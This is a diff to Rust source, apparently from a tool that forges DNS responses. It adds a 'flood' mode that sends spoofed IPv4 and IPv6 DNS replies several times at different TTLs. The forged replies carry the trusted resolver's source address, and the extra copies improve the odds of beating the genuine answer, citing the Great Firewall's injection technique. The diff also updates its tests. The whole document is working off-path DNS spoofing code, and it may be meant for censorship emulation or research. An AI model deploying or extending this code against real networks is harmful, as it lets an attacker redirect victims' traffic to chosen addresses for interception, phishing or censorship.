@@ -28,6 +28,7 @@ fn build_dns_response(
     client_port: u16,
     query: &DnsQuery,
     answer_ip: Ipv4Addr,
+    ttl: u8,
 ) -> Vec<u8> {
     let mut dns = Vec::new();
     dns.extend_from_slice(&query.id.to_be_bytes());
@@ -63,7 +64,7 @@ fn build_dns_response(
         ip.set_version(4);
         ip.set_header_length(5);
         ip.set_total_length(buf_len(IP_HDR_LEN, UDP_HDR_LEN, dns.len()));
-        ip.set_ttl(64);
+        ip.set_ttl(ttl);
         ip.set_flags(Ipv4Flags::DontFragment);
         ip.set_next_level_protocol(IpNextHeaderProtocols::Udp);
         ip.set_source(dns_server);
@@ -78,9 +79,19 @@ fn buf_len(ip: usize, udp: usize, dns: usize) -> u16 {
     (ip + udp + dns) as u16
 }
 
-/// Send the spoofed response. `dns_server` should be the resolver IP the client's
-/// query was actually sent to, so the spoofed reply comes from an address it trusts.
-pub fn send_dns_redirect(
+// Send the same forged answer several times, at different TTLs, instead of
+// once: hedges both race-timing jitter against the real resolver's answer
+// and path-length uncertainty (a copy with too-low a TTL dies before
+// reaching the client; the documented reasoning behind the real GFW's
+// RST-injection technique sending multiple copies - Clayton et al. 2006 -
+// applies just as well to any off-path forged packet, not just RSTs).
+const DNS_FLOOD_TTLS: [u8; 3] = [64, 128, 200];
+
+/// Send the spoofed response `DNS_FLOOD_TTLS.len()` times, one per TTL - see
+/// `DNS_FLOOD_TTLS`. Returns the first error encountered (if any), but keeps
+/// sending the rest - one failed copy in the flood shouldn't cancel the
+/// others, they're independent shots at the same race.
+pub fn send_dns_redirect_flood(
     tx: &mut TransportSender,
     dns_server: Ipv4Addr,
     client: Ipv4Addr,
@@ -88,10 +99,15 @@ pub fn send_dns_redirect(
     query: &DnsQuery,
     answer_ip: Ipv4Addr,
 ) -> std::io::Result<()> {
-    let raw = build_dns_response(dns_server, client, client_port, query, answer_ip);
-    let packet = pnet::packet::ipv4::Ipv4Packet::new(&raw).unwrap();
-    tx.send_to(packet, IpAddr::V4(client))?;
-    Ok(())
+    let mut first_err = None;
+    for &ttl in &DNS_FLOOD_TTLS {
+        let raw = build_dns_response(dns_server, client, client_port, query, answer_ip, ttl);
+        let packet = pnet::packet::ipv4::Ipv4Packet::new(&raw).unwrap();
+        if let Err(e) = tx.send_to(packet, IpAddr::V4(client)) {
+            first_err.get_or_insert(e);
+        }
+    }
+    first_err.map_or(Ok(()), Err)
 }
 
 /// Build a spoofed DNS response over IPv6+UDP with an AAAA record (type 28,
@@ -104,6 +120,7 @@ fn build_dns_response_v6(
     client_port: u16,
     query: &DnsQuery,
     answer_ip: Ipv6Addr,
+    ttl: u8,
 ) -> Vec<u8> {
     let mut dns = Vec::new();
     dns.extend_from_slice(&query.id.to_be_bytes());
@@ -137,7 +154,7 @@ fn build_dns_response_v6(
         ip.set_version(6);
         ip.set_payload_length((UDP_HDR_LEN + dns.len()) as u16);
         ip.set_next_header(IpNextHeaderProtocols::Udp);
-        ip.set_hop_limit(64);
+        ip.set_hop_limit(ttl);
         ip.set_source(dns_server);
         ip.set_destination(client);
     }
@@ -227,7 +244,8 @@ impl Ipv6DnsSender {
     }
 }
 
-pub fn send_dns_redirect_v6(
+/// v6 counterpart of `send_dns_redirect_flood` - see `DNS_FLOOD_TTLS`.
+pub fn send_dns_redirect_v6_flood(
     tx: &Ipv6DnsSender,
     dns_server: Ipv6Addr,
     client: Ipv6Addr,
@@ -235,8 +253,14 @@ pub fn send_dns_redirect_v6(
     query: &DnsQuery,
     answer_ip: Ipv6Addr,
 ) -> std::io::Result<()> {
-    let raw = build_dns_response_v6(dns_server, client, client_port, query, answer_ip);
-    tx.send_raw(&raw, client)
+    let mut first_err = None;
+    for &ttl in &DNS_FLOOD_TTLS {
+        let raw = build_dns_response_v6(dns_server, client, client_port, query, answer_ip, ttl);
+        if let Err(e) = tx.send_raw(&raw, client) {
+            first_err.get_or_insert(e);
+        }
+    }
+    first_err.map_or(Ok(()), Err)
 }
 
 #[cfg(test)]
@@ -263,7 +287,7 @@ mod tests {
         let client = Ipv4Addr::new(10, 27, 0, 39);
         let answer_ip = Ipv4Addr::new(93, 184, 215, 14);
 
-        let raw = build_dns_response(dns_server, client, 55555, &query, answer_ip);
+        let raw = build_dns_response(dns_server, client, 55555, &query, answer_ip, 64);
         let ip = Ipv4Packet::new(&raw).unwrap();
         assert_eq!(ip.get_source(), dns_server);
         assert_eq!(ip.get_destination(), client);
@@ -288,6 +312,24 @@ mod tests {
     }
 
     #[test]
+    fn build_dns_response_honors_requested_ttl() {
+        let query = DnsQuery { id: 1, name: "x".into(), question_raw: vec![0, 0x00, 0x01, 0x00, 0x01] };
+        for &ttl in &DNS_FLOOD_TTLS {
+            let raw = build_dns_response(Ipv4Addr::new(10, 0, 0, 1), Ipv4Addr::new(10, 0, 0, 2), 1, &query, Ipv4Addr::new(1, 1, 1, 1), ttl);
+            assert_eq!(Ipv4Packet::new(&raw).unwrap().get_ttl(), ttl);
+        }
+    }
+
+    #[test]
+    fn flood_ttls_are_distinct_and_not_a_single_shot() {
+        // The whole point is hedging across several different TTLs, not
+        // sending the same packet N times unchanged.
+        assert!(DNS_FLOOD_TTLS.len() > 1);
+        let unique: std::collections::HashSet<u8> = DNS_FLOOD_TTLS.iter().copied().collect();
+        assert_eq!(unique.len(), DNS_FLOOD_TTLS.len());
+    }
+
+    #[test]
     fn v6_redirect_response_is_well_formed() {
         // Pure packet-building is testable on every platform even though actually
         // *sending* it only works on Linux (see Ipv6DnsSender's platform note).
@@ -309,7 +351,7 @@ mod tests {
         let client: Ipv6Addr = "fe80::39".parse().unwrap();
         let answer_ip: Ipv6Addr = "2606:2800:220:1:248:1893:25c8:1946".parse().unwrap();
 
-        let raw = build_dns_response_v6(dns_server, client, 55555, &query, answer_ip);
+        let raw = build_dns_response_v6(dns_server, client, 55555, &query, answer_ip, 64);
         let ip = pnet::packet::ipv6::Ipv6Packet::new(&raw).unwrap();
         assert_eq!(ip.get_version(), 6);
         assert_eq!(ip.get_source(), dns_server);
